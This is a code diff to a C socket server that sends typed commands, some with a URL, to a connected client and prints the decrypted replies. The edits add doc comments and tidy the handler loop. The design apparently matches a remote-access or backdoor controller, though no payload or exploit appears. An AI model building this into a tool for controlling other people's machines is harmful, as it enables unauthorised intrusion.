@@ -7,6 +7,17 @@
 #include "../utils/userIO.h"
 #include "../utils/encryption.h"
 
+/**
+ * Initializes a server socket that listens on the specified port and bind
+ * address. The created socket is returned in the `socket` parameter. Returns
+ * 0 if successful, or a negative value if an error occurs.
+ *
+ * @param socket A pointer to a SOCKET variable that will hold the created socket.
+ * @param bindAddress The IP address or host name to bind the socket to.
+ * @param port The port number to listen on.
+ *
+ * @return 0 if successful, or a negative value if an error occurs.
+ */
 int initializeServer(SOCKET *socket, char *bindAddress, int port)
 {
     if (!(1 < port && port < (1 << 16)))
@@ -40,6 +51,13 @@ int initializeServer(SOCKET *socket, char *bindAddress, int port)
     return 0x0;
 }
 
+/**
+ * Fetch and encode valid user command
+ *
+ * @param pointer to the command buffer to store result in
+ *
+ * @return if the command is to quit
+ */
 BOOLEAN getUserCommand(COMMAND *command)
 {
     while (TRUE)
@@ -56,11 +74,17 @@ BOOLEAN getUserCommand(COMMAND *command)
     }
 }
 
+/**
+ * Wrapper for socket::send
+ */
 int sendCommand(SOCKET *socket, char *message)
 {
     return send(*socket, message, strlen(message), 0x0);
 }
 
+/**
+ * Wrapper for socket::recv
+ */
 int fetchData(SOCKET *socket, char buffer[BUF_SIZE])
 {
     return recv(*socket, buffer, BUF_SIZE, 0x0);
@@ -68,23 +92,28 @@ int fetchData(SOCKET *socket, char buffer[BUF_SIZE])
 
 void clientHandler(SOCKET clientSocket)
 {
-    char *URL;
+    char *URL, message[BUF_SIZE];
     COMMAND command;
-    BOOLEAN quit = FALSE;
-    char message[BUF_SIZE];
+    BOOLEAN quit = FALSE, special;
     int expectedBuffer;
     while (!quit)
     {
         int commandSize = 0;
         quit = getUserCommand(&command);
+        if (quit)
+        {
+            printf("[i] Quit command received\n");
+            break;
+        }
 
-        BOOLEAN special = isSpecial(command);
+        special = isSpecial(command);
         if (special)
         {
             URL = getUserInput("[>] URL: ", BUF_SIZE - sizeof PREAMBLE_FMT);
             strip(URL);
             commandSize = strlen(URL);
         }
+
         snprintf(message, BUF_SIZE, PREAMBLE_FMT, command, commandSize);
         if (sendCommand(&clientSocket, message) == SOCKET_ERROR)
         {
@@ -112,10 +141,7 @@ void clientHandler(SOCKET clientSocket)
         decrypt(command, result, expectedBuffer, expectedBuffer);
         printf("%s\n", result);
     }
-    if (quit)
-    {
-        printf("[i] Quit command received\n");
-    }
+    closesocket(clientSocket);
 }
 
 int main(int argc, char *argv[])
